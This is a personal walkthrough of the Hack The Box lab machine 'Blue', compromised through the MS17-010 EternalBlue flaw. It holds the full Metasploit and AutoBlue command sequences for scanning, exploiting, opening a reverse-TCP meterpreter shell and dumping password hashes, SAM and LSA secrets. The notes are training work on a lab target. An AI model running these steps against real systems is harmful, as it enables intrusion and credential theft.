HTB - 3. Blue (MS17.010)

1. `nmap -T4 -p- -A 10.10.10.40` shows 139 & 445 (smb) open, version Windows 7 Professional 7601 Service Pack 1, computer name is haris-PC, message signing enabled by not required,
2. Metaploit
	Test if vulnerable
	```
	sudo msfconsole
	search ms17-010
	use auxiliary/scanner/smb/smb_ms17_010
	options
	set rhosts 10.10.10.40
	run
	```
	Result: Host is likely vulnerable
	
	Exploit:
	```
	use exploit/windows/smb/ms17_010_eternalblue
	set rhosts 10.10.10.40
	show targets
	run
	```
	Result: shell popped with `nt authoirty/system`
	
	Used an un-staged payload, so lets try staged and get a meterpreter
	```
	set payload windows/x64/meterpreter/reverse_tcp
	options
	run
	getuid
	sysinfo
	hashdump
	shell
	route print
	arp -a
	netstat -ano
	load kiwi
	help
	creds_all
	lsa_dump_sam
	lsa_dump_secrets
	load incognito
	list_tokens -u
	```
3. Autoblue: https://github.com/3ndG4me/AutoBlue-MS17-010
	```
	git clone https://github.com/3ndG4me/AutoBlue-MS17-010
	cd AutoBlue-MS17-010
	ls
	python eternalblue_checker.py 10.10.10.40
	```
	Result: Target not patched
	
	Exploit:
	```
	cd shellcode
	sudo ./shell_prep.sh
	y
	10.10.14.24
	4445
	4446
	0 <-- Meterpreter instead of shell
	0 <-- Staged instead of un-staged
	cd ..
	ls
	sudo ./listener_prep.sh
	10.10.14.24
	4445
	4446
	0
	0
	python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin
	sessions
	sessions 1
	getuid
	whoami
	sysinfo
	```



